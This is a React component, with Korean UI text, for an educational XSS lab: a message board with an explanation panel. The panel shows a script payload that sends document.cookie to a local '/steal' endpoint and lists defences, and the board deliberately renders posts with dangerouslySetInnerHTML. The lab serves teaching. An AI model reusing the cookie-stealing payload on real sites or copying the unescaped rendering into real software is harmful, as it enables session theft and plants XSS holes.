import { useState, useEffect } from 'react';
import { boardApi } from '../api/client';
import './BoardPage.css';

interface Post {
  id?: number;
  name: string;
  content: string;
}

export default function BoardPage() {
  const [posts, setPosts] = useState<Post[]>([]);
  const [name, setName] = useState('');
  const [content, setContent] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showExplanation, setShowExplanation] = useState(false);

  useEffect(() => {
    fetchPosts();
  }, []);

  const fetchPosts = async () => {
    try {
      const response = await boardApi.getPosts();
      const html = response.data;
      
      // HTML에서 게시물 파싱 (간단한 정규식 사용)
      const postRegex = /<div class="post">(.*?)<\/div>/gs;
      const matches = html.matchAll(postRegex);
      
      const parsedPosts: Post[] = [];
      let index = 0;
      for (const match of matches) {
        const postContent = match[1];
        const nameMatch = postContent.match(/<strong>(.*?)<\/strong>/);
        const contentMatch = postContent.match(/<p>(.*?)<\/p>/);
        
        parsedPosts.push({
          id: index++,
          name: nameMatch ? nameMatch[1] : 'Unknown',
          content: contentMatch ? contentMatch[1] : '',
        });
      }
      setPosts(parsedPosts);
    } catch (err: any) {
      setError('게시물을 불러올 수 없습니다.');
      console.error(err);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!name.trim() || !content.trim()) {
      setError('이름과 내용을 모두 입력하세요.');
      return;
    }

    setLoading(true);
    setError('');

    try {
      await boardApi.addPost(name, content);
      setName('');
      setContent('');
      await fetchPosts();
    } catch (err: any) {
      setError(err.response?.data?.message || '게시물 등록 실패');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="board-container">
      <div className="board-wrapper">
        <h1>💬 XSS (Cross-Site Scripting) 실습</h1>

        <div className="info-section">
          <h3>📚 학습 목표</h3>
          <p>
            이 페이지는 XSS(Cross-Site Scripting) 취약점을 체험하고 방어 방법을 
            학습하기 위한 교육용 플랫폼입니다.
          </p>
        </div>

        <button 
          className="explanation-toggle"
          onClick={() => setShowExplanation(!showExplanation)}
        >
          {showExplanation ? '💡 설명 숨기기' : '💡 공격 방법 보기'}
        </button>

        {showExplanation && (
          <div className="explanation-box">
            <h4>🎯 XSS 공격 예제</h4>
            <div className="attack-example">
              <p><strong>이름:</strong> 해커</p>
              <p><strong>내용:</strong></p>
              <code className="code-block">
{`<script>
alert('XSS 공격 성공!');
fetch('http://localhost:5001/steal?cookie=' + 
  encodeURIComponent(document.cookie))
</script>`}
              </code>
            </div>
            <h4>⚙️ 작동 원리</h4>
            <ol>
              <li>공격자가 JavaScript 코드를 포함한 게시물을 등록합니다.</li>
              <li>다른 사용자가 게시판에 접속하면 브라우저가 스크립트를 자동 실행합니다.</li>
              <li>쿠키, 세션 정보 등 민감한 데이터가 공격자에게 전송됩니다.</li>
            </ol>
            <h4>🛡️ 방어 방법</h4>
            <ul>
              <li>사용자 입력값을 HTML 엔티티로 인코딩하기</li>
              <li>DOMPurify 라이브러리로 위험한 HTML 제거하기</li>
              <li>Content Security Policy (CSP) 헤더 설정하기</li>
            </ul>
            <pre className="code-block">{`// 안전한 예제 (React에서)
&lt;div&gt;{userInput}&lt;/div&gt;
// React는 기본적으로 자동으로 이스케이프합니다.

// Vanilla JS에서는
const safe = document.createTextNode(userInput);
element.appendChild(safe);`}</pre>
          </div>
        )}

        <div className="board-content">
          <div className="post-form">
            <h3>✍️ 게시물 작성</h3>
            <form onSubmit={handleSubmit}>
              <div className="form-group">
                <label htmlFor="name">이름</label>
                <input
                  id="name"
                  type="text"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  placeholder="이름을 입력하세요"
                  disabled={loading}
                />
              </div>

              <div className="form-group">
                <label htmlFor="content">내용</label>
                <textarea
                  id="content"
                  value={content}
                  onChange={(e) => setContent(e.target.value)}
                  placeholder="내용을 입력하세요. (HTML 태그도 가능)"
                  rows={5}
                  disabled={loading}
                />
              </div>

              <button type="submit" disabled={loading} className="submit-btn">
                {loading ? '등록 중...' : '등록'}
              </button>
            </form>

            {error && (
              <div className="error-box">
                <p>❌ {error}</p>
              </div>
            )}
          </div>

          <div className="posts-list">
            <h3>📋 게시물 목록 ({posts.length})</h3>
            {posts.length === 0 ? (
              <p className="empty-message">게시물이 없습니다.</p>
            ) : (
              <div className="posts">
                {posts.map((post) => (
                  <div key={post.id} className="post-item">
                    <div className="post-header">
                      <strong>{post.name}</strong>
                      <span className="post-id">#{post.id}</span>
                    </div>
                    {/* XSS 취약점 시뮬레이션: 실제로는 위험하지만, 이것이 교육 목적 */}
                    <div className="post-content" dangerouslySetInnerHTML={{ __html: post.content }} />
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
